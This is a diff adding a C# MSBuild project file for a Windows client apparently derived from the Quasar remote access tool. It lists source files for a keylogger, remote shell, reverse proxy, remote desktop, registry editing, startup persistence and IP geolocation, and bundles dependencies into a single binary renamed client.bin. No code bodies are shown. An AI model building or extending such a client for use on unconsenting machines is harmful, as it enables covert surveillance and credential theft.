@@ -1,0 +1,152 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="..\packages\Costura.Fody.6.0.0\build\Costura.Fody.props" Condition="Exists('..\packages\Costura.Fody.6.0.0\build\Costura.Fody.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{B911E2FA-3F64-48BF-8723-90BA3DBF2C0F}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>Client</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <ApplicationVersion>0.0.0.0</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+    <RootNamespace>InvokedClient</RootNamespace>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d, processorArchitecture=MSIL">
+      <HintPath>..\packages\Costura.Fody.6.0.0\lib\netstandard2.0\Costura.dll</HintPath>
+    </Reference>
+    <Reference Include="Gma.System.MouseKeyHook">
+      <HintPath>lib\Gma.System.MouseKeyHook.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="newtonsoft.json">
+      <HintPath>lib\newtonsoft.json.dll</HintPath>
+    </Reference>
+    <Reference Include="protobuf-net">
+      <HintPath>lib\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="system.diagnostics.diagnosticsource, Version=8.0.0.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>lib\system.diagnostics.diagnosticsource.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ClientTestInterface.cs" />
+    <Compile Include="InvokedClientApplication.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MultiFormContext.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Utilities\NativeMethods.cs" />
+    <Compile Include="Utilities\SingleInstanceMutex.cs" />
+    <Compile Include="User\ActivityDetection.cs" />
+    <Compile Include="User\UserAccount.cs" />
+    <Compile Include="Setup\ClientInstaller.cs" />
+    <Compile Include="Setup\ClientSetupBase.cs" />
+    <Compile Include="Setup\ClientStartup.cs" />
+    <Compile Include="Setup\ClientUninstaller.cs" />
+    <Compile Include="Setup\ClientUpdater.cs" />
+    <Compile Include="Registry\RegistryEditor.cs" />
+    <Compile Include="Registry\RegistrySeeker.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.cs" />
+    <Compile Include="Networking\QuasarClient.cs" />
+    <Compile Include="MessageHandlers\ClientServicesHandler.cs" />
+    <Compile Include="MessageHandlers\FileManagerHandler.cs" />
+    <Compile Include="MessageHandlers\KeyloggerHandler.cs" />
+    <Compile Include="MessageHandlers\MessageBoxHandler.cs" />
+    <Compile Include="MessageHandlers\PluginHandler.cs" />
+    <Compile Include="MessageHandlers\RegistryHandler.cs" />
+    <Compile Include="MessageHandlers\RemoteShellHandler.cs" />
+    <Compile Include="MessageHandlers\ReverseProxyHandler.cs" />
+    <Compile Include="MessageHandlers\ShutdownHandler.cs" />
+    <Compile Include="MessageHandlers\StartupManagerHandler.cs" />
+    <Compile Include="MessageHandlers\SystemInformationHandler.cs" />
+    <Compile Include="MessageHandlers\TaskManagerHandler.cs" />
+    <Compile Include="MessageHandlers\TcpConnectionsHandler.cs" />
+    <Compile Include="MessageHandlers\WebsiteVisitorHandler.cs" />
+    <Compile Include="Logging\Keylogger.cs" />
+    <Compile Include="Logging\KeyloggerService.cs" />
+    <Compile Include="IpGeoLocation\GeoInformation.cs" />
+    <Compile Include="IpGeoLocation\GeoInformationFactory.cs" />
+    <Compile Include="IpGeoLocation\GeoInformationRetriever.cs" />
+    <Compile Include="IpGeoLocation\GeoResponse.cs" />
+    <Compile Include="IpGeoLocation\Time.cs" />
+    <Compile Include="IpGeoLocation\Conn.cs" />
+    <Compile Include="IO\BatchFile.cs" />
+    <Compile Include="IO\HardwareDevices.cs" />
+    <Compile Include="IO\Shell.cs" />
+    <Compile Include="Helper\DateTimeHelper.cs" />
+    <Compile Include="Helper\JsonHelper.cs" />
+    <Compile Include="Helper\NativeMethodsHelper.cs" />
+    <Compile Include="Helper\RegistryKeyHelper.cs" />
+    <Compile Include="Helper\RemoteDesktopHelper.cs" />
+    <Compile Include="Helper\SystemHelper.cs" />
+    <Compile Include="Helper\Zip.cs" />
+    <Compile Include="Extensions\KeyExtensions.cs" />
+    <Compile Include="Extensions\ProcessExtensions.cs" />
+    <Compile Include="Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Config\Settings.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="InvokedClientApplication.resx" />
+    <EmbeddedResource Include="Properties\Resources.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="packages.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\InvokedCommon\InvokedCommon.csproj">
+      <Project>{467046a7-a9ca-439d-bcf4-10ce2913ea5f}</Project>
+      <Name>InvokedCommon</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Import Project="..\packages\Fody.6.8.2\build\Fody.targets" Condition="Exists('..\packages\Fody.6.8.2\build\Fody.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\Fody.6.8.2\build\Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Fody.6.8.2\build\Fody.targets'))" />
+    <Error Condition="!Exists('..\packages\Costura.Fody.6.0.0\build\Costura.Fody.props')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.6.0.0\build\Costura.Fody.props'))" />
+    <Error Condition="!Exists('..\packages\Costura.Fody.6.0.0\build\Costura.Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.6.0.0\build\Costura.Fody.targets'))" />
+  </Target>
+  <Import Project="..\packages\Costura.Fody.6.0.0\build\Costura.Fody.targets" Condition="Exists('..\packages\Costura.Fody.6.0.0\build\Costura.Fody.targets')" />
+  <PropertyGroup>
+    <PostBuildEvent>del $(TargetDir)\client.bin /s /q
+ren $(TargetPath) client.bin</PostBuildEvent>
+  </PropertyGroup>
+</Project>
